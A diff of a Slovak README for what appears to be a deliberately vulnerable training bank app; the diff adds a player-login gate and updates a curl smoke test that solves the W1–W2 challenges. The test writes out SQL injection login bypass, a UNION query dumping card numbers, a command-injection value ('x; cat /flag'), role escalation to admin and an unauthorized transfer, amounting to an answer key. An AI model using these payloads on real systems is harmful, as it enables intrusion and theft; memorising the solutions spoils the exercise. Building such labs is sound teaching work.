@@ -38,8 +38,21 @@ Reset do čistého zraniteľného stavu:
 docker compose down -v && docker compose up --build
 ```
 
-### Ako sa dostať „dnu"
-Bežný hráč nemá platné heslo — vstup je cez **W1-01 (SQLi login bypass)** nižšie.
+### Prístup cez bránu (access gate)
+Aplikácia beží **za bezpečnou bránou** — `http://localhost:8080` je brána, nie
+priamo appka:
+1. Otvor `http://localhost:8080` → prihlás sa **účtom hráča** (vydá organizátor;
+   ukážkové v `gate/players.json`, napr. `tester` / `test123`).
+2. Potom používaš banku ako nižšie; brána každý request loguje s tvojou identitou.
+3. **Operátor/monitoring:** `http://localhost:8080/_gate/admin` (admin z `.env`:
+   `GATE_ADMIN_USER` / `GATE_ADMIN_PASSWORD`) — živý prehľad aktivity podľa hráča,
+   mimo zraniteľnej appky.
+
+> Pri **curl** overovaní si najprv vezmi cookie brány (`_gate/login`) a používaj
+> ten istý cookie jar (`-b ck.txt`) vo všetkých volaniach — viď smoke-test nižšie.
+
+### Ako sa dostať „dnu" (do banky)
+Bežný hráč nemá platné bankové heslo — vstup do banky je cez **W1-01 (SQLi login bypass)** nižšie.
 Po prihlásení sa sprístupnia bankové funkcie (Prehľad, Transakcie, Prevod, Export,
 prípadne Asistent).
 
@@ -163,21 +176,24 @@ Zisti zostatok na účte číslo 3.
 ## Rýchly „smoke test" celého W1–W3 (curl)
 
 ```bash
-# W1-01 login + cookie
-curl -s -c ck.txt --data-urlencode "username=' OR '1'='1'-- " --data-urlencode "password=x" http://localhost:8080/login >/dev/null
+# 0) prihlasenie do BRANY (vsetky dalsie volania pouzivaju ten isty ck.txt)
+curl -s -c ck.txt -o /dev/null -X POST -d "username=tester" -d "password=test123" http://localhost:8080/_gate/login
+
+# W1-01 login do banky (gate cookie + app cookie v ck.txt)
+curl -s -b ck.txt -c ck.txt --data-urlencode "username=' OR '1'='1'-- " --data-urlencode "password=x" http://localhost:8080/login >/dev/null
 curl -s -b ck.txt http://localhost:8080/dashboard | grep -o 'RPC{[^}]*}'                        # W1-01
 curl -s -b ck.txt -G http://localhost:8080/transactions --data-urlencode "q=' UNION SELECT card_number, card_holder, status FROM cards-- " | grep -o 'RPC{[^}]*}' | tail -1   # W1-02
-curl -s http://localhost:8080/search/solved                                                     # W1-04
+curl -s -b ck.txt http://localhost:8080/search/solved                                           # W1-04
 curl -s -b ck.txt -G http://localhost:8080/export --data-urlencode "name=x; cat /flag" | grep -o 'RPC{[^}]*}'   # W1-05
 
-# W2 (WEEK>=2)
-TOK=$(curl -s --data-urlencode "username=' OR '1'='1'-- " --data-urlencode "password=x" http://localhost:8080/api/v1/login | grep -o '"token":"[^"]*"' | sed 's/"token":"//;s/"//')
-curl -s -H "Authorization: Bearer $TOK" http://localhost:8080/api/v1/accounts/3/transactions | grep -o 'RPC{[^}]*}'    # W2-01
-curl -s -X POST -H "Authorization: Bearer $TOK" http://localhost:8080/api/v1/admin/cards/4/unblock | grep -o 'RPC{[^}]*}' # W2-02
-curl -s -X PATCH -H "Authorization: Bearer $TOK" --data-urlencode "role=admin" http://localhost:8080/api/v1/profile >/dev/null
-curl -s -H "Authorization: Bearer $TOK" http://localhost:8080/api/v1/admin/portal | grep -o 'RPC{[^}]*}'              # W2-03
-curl -s -X POST -H "Authorization: Bearer $TOK" --data-urlencode "amount=999999" --data-urlencode "currency=USD" --data-urlencode "to_account=3" http://localhost:8080/api/v1/transfers | grep -o 'RPC{[^}]*}'  # W2-04
-curl -s -H "Authorization: Bearer $TOK" "http://localhost:8080/api/v1/statements?account=abc" | grep -o 'RPC{[^}]*}'   # W2-05
+# W2 (WEEK>=2) — token cez branu
+TOK=$(curl -s -b ck.txt --data-urlencode "username=' OR '1'='1'-- " --data-urlencode "password=x" http://localhost:8080/api/v1/login | grep -o '"token":"[^"]*"' | sed 's/"token":"//;s/"//')
+curl -s -b ck.txt -H "Authorization: Bearer $TOK" http://localhost:8080/api/v1/accounts/3/transactions | grep -o 'RPC{[^}]*}'    # W2-01
+curl -s -b ck.txt -X POST -H "Authorization: Bearer $TOK" http://localhost:8080/api/v1/admin/cards/4/unblock | grep -o 'RPC{[^}]*}' # W2-02
+curl -s -b ck.txt -X PATCH -H "Authorization: Bearer $TOK" --data-urlencode "role=admin" http://localhost:8080/api/v1/profile >/dev/null
+curl -s -b ck.txt -H "Authorization: Bearer $TOK" http://localhost:8080/api/v1/admin/portal | grep -o 'RPC{[^}]*}'              # W2-03
+curl -s -b ck.txt -X POST -H "Authorization: Bearer $TOK" --data-urlencode "amount=999999" --data-urlencode "currency=USD" --data-urlencode "to_account=3" http://localhost:8080/api/v1/transfers | grep -o 'RPC{[^}]*}'  # W2-04
+curl -s -b ck.txt -H "Authorization: Bearer $TOK" "http://localhost:8080/api/v1/statements?account=abc" | grep -o 'RPC{[^}]*}'   # W2-05
 ```
 
 (W3 sa overuje interaktívne v `/assistant`, keďže ide o LLM.)
